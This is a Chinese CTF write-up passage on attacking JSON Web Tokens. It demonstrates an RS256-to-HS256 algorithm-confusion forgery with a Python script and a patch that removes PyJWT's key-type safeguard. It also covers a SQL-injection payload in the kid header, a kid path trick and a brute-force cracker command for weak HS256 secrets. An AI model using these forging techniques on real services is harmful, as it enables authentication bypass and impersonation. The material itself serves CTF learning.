    signature
所以我的想法就是探测pubkey泄露，利用公私钥伪造json web token  
因为这个题的机制是私钥加密，公钥解密  
所以只要我们能拿到私钥，即可伪造json web token  
关注到格式
    function getpubkey(){
        /* 
        get the pubkey for test
        /pubkey/{hash}
        */
    }
天真的我尝试了
    md5(username)
    md5(salt.username)
    md5(username.salt)
其中salt试了无数，例如Bearer,bxs,rebirth  
都没有成功，心态崩了，暂且搁置  
后来得到提示
    Web Pastebin /pubkey/md5(username+password)
我才发现是username+password  
访问
    http://pastebin.bxsteam.xyz/pubkey/4eb8deaa574fdc8257e39b5dd4c6490e
得到
    {"pubkey":"-----BEGIN PUBLIC KEY-----nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCtRgwKdQFRKkXupJ8lHIXT/QTinmT9lobR6+1m4ubQXFaBlM7sJkzaoasPdU6e/5dJ5TelQSC59deolcXJ1iHf4/QmzndDX3L/ShtfPXZEGKkYCKC2kF0ekBz4W4LSQfaunZEz/yoScLqz9wOP8vwxAYN+P1nFtFrTzMdBYo8begEewIDAQABn-----END PUBLIC KEY-----","result":true}
解析公钥
    key长度：    1024
    模数：    AD460C0A7501512A45EEA49F251C85D3FD04E2993F65A1B47AFB59B8B9B41715A06533BB099336A86AC3DD53A7BFE5D2794DE950482E7D75EA257172758877F8FD09B37435F72FF4A1B5F3D764418A91808A0B6905D1E901CF85B82D241F6AE9D9133FF2A1270BAB3F7038FF2FC3101837E3F516D16B4F331D058A3C6DE8047B
    指数：    65537 (0x10001)
本想尝试分解，但发现1024bit的n基本无解，所以私钥是不可能获取了，这个时候我的思路其实被灭杀了。  
因为没有私钥基本不能篡改json web token，毕竟无法通过消息验证码校验  
而这里就需要修改算法RS256为HS256（非对称密码算法 => 对称密码算法）  
算法HS256使用秘密密钥对每条消息进行签名和验证。  
算法RS256使用私钥对消息进行签名，并使用公钥进行验证。  
如果将算法从RS256更改为HS256，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。  
由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。  
后端代码会使用RSA公钥+HS256算法进行签名验证。  
即更改算法为HS256，此时即不存在公钥私钥问题，因为对称密码算法只有一个key  
此时即我们可以任意访问的pubkey  
故此我立刻写出了构造脚本
    import jwt
    import base64
    public = open('1.txt', 'r').read()
    print jwt.encode({"name": "adminsky","priv": "admin"}, key=public, algorithm='HS256')
注：1.txt为公钥  
priv为admin，因为之前为other，即其他人，同时只有admin可以读flag，所以这里猜测为admin  
运行发现报错：
    File "G:python2.7libsite-packagesjwtalgorithms.py", line 151, in prepare_key
        'The specified key is an asymmetric key or x509 certificate and'
    jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.
发现源码的第151行爆破了，于是去跟踪库的源码  
发现
    def prepare_key(self, key):
            key = force_bytes(key)
            invalid_strings = [
                b'-----BEGIN PUBLIC KEY-----',
                b'-----BEGIN CERTIFICATE-----',
                b'-----BEGIN RSA PUBLIC KEY-----',
                b'ssh-rsa'
            ]
            if any([string_value in key for string_value in invalid_strings]):
                raise InvalidKeyError(
                    'The specified key is an asymmetric key or x509 certificate and'
                    ' should not be used as an HMAC secret.')
            return key
prepare_key会判断是否有非法字符，简单粗暴的注释掉
    def prepare_key(self, key):
            key = force_bytes(key)
            return key
保存后再运行得到
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW5za3kiLCJwcml2IjoiYWRtaW4ifQ.zc8m-ymnOrwuvd2kdsKMBVrT_9JXPXHkFf4vcPWecqI
然后利用这个去访问list  
即可得到admin的消息  
    admin:4fd5988f73c7a414f4c947e9fd708811
访问
    http://pastebin.bxsteam.xyz/text/admin:4fd5988f73c7a414f4c947e9fd708811
得到flag
    {"content":"cumtctf{jwt_is_not_safe_too_much}","result":true}
至此，我们成功用修改算法攻击(非对称密码 => 对称密码)破解了此题
###  密钥可控问题
**题目1：**  
在国赛中，我遇到了这样的JWT:
    eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiI4MjAxIn0.eyJuYW1lIjoiYWRtaW4yMzMzIn0.aC0DlfB3pbeIqAQ18PaaTOPA5PSipJe651w7E0BZZRI
header头：
    {
        "typ":"JWT",
        "alg":"sha256",
        "kid":"8201"
    }
其中kid为密钥key的编号id  
类似逻辑为
    sql="select * from table where kid=$kid"
这样查询出来的值即为key的值  
但是如果我们在这里进行恶意篡改，例如
    kid = 0 union select 12345
这样查询出来的结果必然为12345  
这样等同于我们控制了密钥key  
拥有了密钥key，那么即可任意伪造消息，达到成为admin登入的目的了  
 **题目2：**  
同样在HITB 2017中也存在一道这样可控密钥的题目  
这里的详情可以在最后的参考链接中查看，这里我简要叙述一下  
首先header中同样存在kid可控问题
    {
        "kid":"keys/3c3c2ea1c3f113f649dc9389dd71b851",
        "typ":"JWT",
        "alg":"RS256"
    }
并且题目存在写消息保存于本地的功能  
于是最后可以自己写公钥，保存于服务器  
利用kid可控的路径去加载自己写的公钥  
然后用相应的私钥去篡改信息，伪造admin，利用我们自己写的公钥进行验证
###  密钥爆破问题
我们知道在HS签名算法中，只有一个密钥  
如果这个密钥的复杂度不够，或者为弱口令  
那么很容易导致攻击者轻松的破解，达到篡改消息，伪造身份的目的  
破解工具也有现成的：
    https://github.com/brendan-rius/c-jwt-cracker
使用方法：
    ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
即可得到密钥：`Sn1f`  
然后即可进行消息的恶意伪造，篡改
## 参考链接